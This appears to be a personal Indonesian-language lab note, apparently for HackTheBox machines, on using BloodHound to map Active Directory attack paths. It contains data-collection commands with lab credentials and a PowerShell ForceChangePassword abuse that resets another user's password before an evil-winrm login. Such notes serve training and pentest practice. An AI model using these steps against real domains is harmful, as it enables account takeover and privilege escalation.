**tools untuk memetakan jalur serangan di Active Directory** — visualisasi siapa punya akses ke apa, dan gimana caranya sampai ke Domain Admin.
Kapan mulai pake bloodhound?
==setelah punya credential atau akses ke domain, sekecil apapun itu==

dahulukan credential plaintext untuk generate bloodhound

# 1. MAPPING SERANGAN
## A. Colect data
dahulukan credential plaintext untuk generate bloodhound
```shell
bloodhound-python -u 'j.arbuckle' -p 'Th1sD4mnC4t!@1978' -dc 'DC01.garfield.htb' -d 'garfield.htb' --dns-tcp -ns 10.129.244.207 --dns-timeout 10 --zip -c All
```

kalau tidak bisa, gunakan nxc
```shell
nxc ldap 10.129.5.193 -u 'alex.turner' -p 'Checkpoint2024!' --bloodhound -c All 
```

kalau tidak bisa juga, gunakan bloodyad
```shell
bloodyad --host dc01.checkpoint.htb -d checkpoint.htb -u alex.turner -p 'Checkpoint2024!' get bloodhound
```
![](Attachments/Pasted%20image%2020260622145414.png)
## B. Mark "OWNED"
semua akun yang dimiliki, termasuk:
- user password
- TGT
- shell

## C. Cek Outbound Object Control
apa yang bisa Akun ini kontrol.
https://sn0xs-organization.gitbook.io/sn0x-order.org/red-team-notes/ad-exploitation/information-gathering/bloodyad 
https://www.thehacker.recipes/ad/movement/dacl/
### i. Generic Write
[Attack - Shadow Credential](Attack%20-%20Shadow%20Credential.md)
### iI. ForceChangePassword
```powershell
# Change password from windows shell
$TargetUser = [ADSI]"LDAP://CN=Liz Wilson ADM,CN=Users,DC=garfield,DC=htb"
$TargetUser.psbase.Invoke("SetPassword", "YourNewPass123!")

# test login from linux
evil-winrm -i garfield.htb -u 'l.wilson_adm' -p 'YourNewPass123!'
```
![](Attachments/Pasted%20image%2020260805132538.png)

# 2. ERROR
## deadbeef
problem -> ipv6 active
![](Attachments/Pasted%20image%2020260622134301.png)
solusi -> disable
```shell
sudo sysctl -w net.ipv6.conf.all.disable_ipv6=1
sudo sysctl -w net.ipv6.conf.default.disable_ipv6=1
ip a | grep inet6
```